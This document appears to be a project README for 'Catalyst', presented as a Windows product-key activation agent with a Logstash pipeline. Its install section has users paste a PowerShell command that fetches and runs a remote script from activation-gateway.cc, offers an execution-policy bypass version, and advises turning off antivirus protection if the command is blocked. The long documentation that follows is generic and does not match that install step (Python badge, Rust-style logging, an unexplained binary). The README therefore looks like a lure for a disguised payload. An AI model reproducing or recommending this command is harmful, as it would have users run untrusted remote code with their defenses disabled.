<div align="center">

# Catalyst: Simple Activation Agent & Logstash — Windows Automation

![preview](https://raw.githubusercontent.com/openfireflyboy/catalyst-automation-agent/main/showcase_f80e91.svg)

[![lang](https://img.shields.io/badge/LANG-PYTHON-2f81f7?style=flat&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-PASSING-2ea44f?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-5.1%2B_%2F_7%2B-54aeff?style=flat&labelColor=0d1117)]()

</div>

---

Catalyst is a lightweight activation agent paired with a Logstash pipeline, built to handle simple product key activation and key management without extra moving parts. The scripts here cover the core flows: issuing keys, validating activations, and shipping the resulting events through Logstash for downstream use. Everything is kept deliberately small so you can read the automation end to end and adapt it to your own environment.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Launch PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## What it does

Catalyst handles product key activation and key management as a small service. It accepts activation requests, validates keys against its stored inventory, and records the outcome, so you get a consistent answer instead of tracking licenses by hand.

The activation agent is the piece that talks to your product or script. It sends a key plus whatever identity context you configure, waits for a response, and reports success or failure back to the caller. If a key is already bound, exhausted, or unknown, the agent tells you which, rather than failing silently.

Behind it sits a logstash pipeline that captures each request and result as a structured event. That gives you an audit trail of who activated what and when, and it means activation history is queryable instead of buried in application logs.

Configuration is deliberately thin: point the agent at the service, set your storage and logging options, and define how strict you want validation to be. Defaults work for a single machine; the same options scale to a shared deployment.

Use it when you need lightweight key issuing and redemption without standing up a full licensing platform, or when you want activation events flowing into a log pipeline you already run.

## Configuration

Catalyst reads its runtime settings from a single configuration file, and every value has a sensible default so you can start with an empty file and override only what you need.

The agent and the logstash side each load their own config file at startup. Paths are resolved relative to the working directory unless you pass an explicit path. Keep secrets out of the repository and point the loader at an environment-specific file instead.

| Key | Default | Purpose |
| --- | --- | --- |
| `listen_host` | `127.0.0.1` | Interface the agent binds to. |
| `listen_port` | `8080` | Port for incoming activation requests. |
| `logstash_host` | `127.0.0.1` | Logstash endpoint the agent forwards events to. |
| `logstash_port` | `5044` | Logstash ingestion port. |
| `request_timeout` | `10` | Seconds before an outbound request is dropped. |
| `retry_attempts` | `3` | How many times a failed delivery is retried. |
| `key_store_path` | `./keys.db` | Local store for issued and validated keys. |
| `log_level` | `info` | Verbosity: `debug`, `info`, `warn`, or `error`. |

Values are parsed as strings, integers, or booleans depending on the key. Unknown keys are ignored with a warning rather than failing the boot, so a stale config file won't take the service down.

Environment variables override file values when present. Prefix them with `CATALYST_` and use the upper-cased key name, for example `CATALYST_LISTEN_PORT`. This is the preferred way to inject secrets and per-deployment ports without editing files.

For anything beyond the defaults, edit the file and restart the process. Changes are not hot-reloaded; the agent re-reads everything on startup. Validate a config before deploying by running the binary with the check flag, which parses the file, reports unknown or malformed keys, and exits without binding a port.

## Usage examples

Start with the smallest thing that works: launch the agent in the foreground against a local config file so you can watch the output while you poke at it.

```bash
catalyst --config ./catalyst.toml run --foreground
```

If the process starts clean and prints its listening address, you're good. Anything missing from the config surfaces here as a startup error instead of a silent half-running service, which is exactly what you want during bring-up.

To validate a config without actually starting the service, run the check pass first. It parses the file, resolves paths, and reports the first problem it hits:

```bash
catalyst --config ./catalyst.toml check
```

A quick end-to-end activation looks like a single request to the agent's local endpoint. Keep a key you've already provisioned handy, then send a minimal payload:

```bash
catalyst request --key ABC1-DEF2-GHI3 --product demo-app --verbose
```

The `--verbose` flag echoes the request and the parsed response, which is the fastest way to confirm you're sending the fields the agent expects. Drop the flag once it's working.

For batch work, feed a list of keys from stdin. One key per line, blank lines ignored, and the summary goes to stderr so you can pipe stdout somewhere useful:

```bash
catalyst request --product demo-app --from-stdin < keys.txt > results.jsonl
```

Logstash side: point the shipper at the agent's event stream and write to a file sink so you have a local record before wiring up anything downstream.

```yaml
input:
 catalyst_agent:
 endpoint: unix:///run/catalyst.sock
 product: demo-app

output:
 file:
 path: /var/log/catalyst/events.jsonl
 codec: json_lines
```

Run it with the stock logstash binary and your pipeline file:

```bash
logstash -f ./pipeline.conf --config.reload.automatic
```

`--config.reload.automatic` saves you a restart every time you tweak the pipeline during development. Turn it off in anything long-lived.

A common dev loop: tail the event file in one terminal while driving requests from another. Rotate the file out from under the process and the sink picks up the new handle on the next write, so you don't need to bounce the shipper just to clear logs.

```bash
tail -f /var/log/catalyst/events.jsonl | jq -c 'select(.result == "ok")'
```

When something looks wrong, raise the agent's log verbosity for the run rather than editing the config. Assuming a `RUST_LOG`-style switch:

```bash
RUST_LOG=catalyst=debug catalyst --config ./catalyst.toml run --foreground
```

Capture the full run to a file when you need to share it:

```bash
RUST_LOG=catalyst=trace catalyst --config ./catalyst.toml run --foreground 2> catalyst-trace.log
```

For a one-off activation against a key you suspect is already burned, the agent reports the prior binding instead of failing dark. Check the exit code — nonzero means the key was rejected, zero with a `reused` field means it activated against an existing binding. Script against the exit code, read the JSON for the detail.

If you're running under a supervisor, hand it the config path and let it manage restarts; don't wrap the foreground mode in your own loop, since the agent already handles SIGTERM and exits cleanly so the supervisor can back off as needed:

```bash
catalyst --config /etc/catalyst/catalyst.toml run
```

Keep configs per environment and switch with a symlink or an environment variable pointing at the config path. Hardcoding endpoints in pipelines is the usual source of "works on my machine" confusion when the staging and production agents disagree.

## FAQ

**Is catalyst production-ready?**
No. Treat it as a working tool for internal or low-risk scenarios. Test your specific configuration and rollback path before wiring it into anything that matters.

**How does activation actually work?**
The agent receives an activation request, validates the supplied product key against the keys you've configured, and returns a result. Logstash handles the event flow so activation attempts and outcomes land in a predictable stream. Nothing magic: keys in, decision out, events logged.

**Where do I put keys and settings?**
Configuration is file-based and read at startup. Keep keys out of version control and out of the repo—load them from the environment or a local config file your deploy process injects. If you change config, restart the agent; there's no live reload.

**Can I run this behind other services or off localhost?**
Yes, but that's your call to make. The agent doesn't ship with TLS termination or auth hardening. Put it behind a reverse proxy you control, restrict network access, and don't expose it directly to the open internet.

**Why is my activation request failing?**
Work through the boring causes first: the key isn't in the configured key set, the key was already consumed, the request payload doesn't match the expected shape, or the agent can't read its config. Check the logstash output for the rejection reason before touching code.

**Does it handle concurrent requests?**
It's meant for simple, low-volume activation. If you're hammering it with parallel requests, expect races around key consumption. Serialize writes or run a single instance unless you've verified otherwise.

**Can I use it with a different log pipeline?**
Logstash is the assumption baked into the event flow. You can redirect output if you know the format, but you're on your own for parsing and delivery. The event shape is stable enough to consume elsewhere.

**How do I keep keys in sync across environments?**
Treat the key file as deployable state, versioned in your secrets store, not in the repo. Rotate keys through your normal release process. Don't hand-edit files on running hosts.

**What about logs and retention?**
Catalyst emits activation events; retention and rotation are logstash's job. Set sane limits so disks don't fill. There's no built-in cleanup.

**Something's broken—what do I check first?**
Config loads, keys are present and readable, the port isn't already taken, and logstash can reach its downstream. Nine times out of ten it's one of those four.

**Can I contribute fixes?**
Yes—open an issue or a pull request on the project. Keep changes small and include a repro for bugs. This is a simple tool; don't turn it into a platform.

## Disclaimer

Catalyst is provided as-is, with no warranty of any kind, express or implied. It is intended for legitimate software activation and key management workflows; you are responsible for ensuring your use of it complies with the licenses and terms that apply to any software or keys you process through it.

The scripts and agent logic are designed to be readable and modifiable, but that also means they will happily do exactly what you tell them to — including things you did not intend. Test configuration changes in a safe environment before pointing them at anything that matters, and keep backups of key data before running bulk operations.

Do not treat Catalyst as a hardened security boundary. It is a simple activation agent and logstash, not an authentication or secrets-management system. Store credentials, keys, and log data according to your own security requirements, restrict who can reach the service, and avoid exposing it to untrusted networks.

Logs may contain sensitive information depending on what you feed into the logstash. Review retention and access settings before enabling verbose logging in production.

The maintainers make no guarantees about fitness for a particular purpose, uptime, or backward compatibility between versions. APIs, configuration formats, and behavior may change as the project evolves. Pin to a version you have validated if stability matters to you.

If you find a bug or a security issue, report it through the project's issue tracker rather than deploying a workaround you have not reviewed.